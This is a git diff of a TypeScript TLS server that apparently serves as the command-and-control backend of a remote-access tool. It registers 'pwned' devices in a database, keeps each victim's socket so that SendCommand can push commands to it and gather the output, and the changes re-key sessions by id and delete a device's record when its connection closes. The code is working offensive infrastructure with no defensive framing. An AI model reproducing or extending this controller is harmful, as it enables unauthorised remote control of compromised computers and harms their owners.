@@ -31,8 +31,10 @@ async function addSession(sock: tls.TLSSocket, data: string) {
     if (!info.sid)
         return false;
 
-    const sess_s = `${info.username}:${info.hostname}`;
-    sessions.set(sess_s, {
+    // if we lose this socket connection
+    // we will overwrite it with the fresher
+    // socket connection
+    sessions.set(info.sid, {
         socket: sock,
         hostname: info.hostname,
         username: info.username,
@@ -45,7 +47,7 @@ async function addSession(sock: tls.TLSSocket, data: string) {
             model: info.model,
             machine_id: info.machine_id,
             sid: info.sid
-        })
+        });
     } catch (e) {
         console.warn("[*] Error Inserting Pwned Device")
         console.error(e);
@@ -60,38 +62,34 @@ const server = tls.createServer({
     cert: fs.readFileSync(process.env.cert_pem ?? "server-cert.pem"),
 }, (socket) => {
     let tracked = false;
-    let buffer = '';
 
     // runs after established
     console.log("Secure client connected");
-    
 
     // read stream from remote client
     socket.on('data', async (data) => {
         if (!tracked) {
             tracked = await addSession(socket, data.toString());
         } else {
-            buffer += data.toString();
-    
-            const lines = buffer.split('\n');
-            buffer = lines.pop() ?? '';
-    
-            for (const line of lines) {
-                output += line + '\n';
+            output += data.toString() + "\n";
+        }
+    });
+
+    socket.on("close", async (data) => {
+        console.log("Connection Closed");
+
+        // attempt to remove entry from DB so it does not
+        // appear on the web-interface
+        for (const [sid, client] of sessions) {
+            if (client.socket != socket) continue;
+            try {
+                await db.delete(devices)
+                    .where(eq(devices.sid, sid));
+            } catch (e) {
+                console.warn("[*] Error Removing Compromise Entry")
+                console.error(e);
             }
         }
-    });
-
-    // flush the buffer string to output
-    socket.on('end', () => {
-        if (buffer.length) {
-            output += buffer;
-            buffer = '';
-        }
-    });
-
-    socket.on("close", (data) => {
-        console.log("Connection Closed");
     });
 });
 
@@ -110,8 +108,7 @@ export async function SendCommand(sid: string, cmd: string) {
     if (recent_sid != sid) output = "";
     recent_sid = sid;
 
-    // use sid to query from the DB to
-    // get the sess_s used to pull from the map
+    // check if compromised device is still available
     const device = await db.select().from(devices)
                     .where(eq(devices.sid, sid)).limit(1).get();
     if (!device) {
@@ -119,8 +116,8 @@ export async function SendCommand(sid: string, cmd: string) {
         return false;
     }
 
-    const sess_s = `${device.username}:${device.hostname}`;
-    const session = sessions.get(sess_s);
+    // fetch tls socket to write cmd to
+    const session = sessions.get(sid);
     if (!session) {
         console.error("[-] No Session Found!")
         return false;
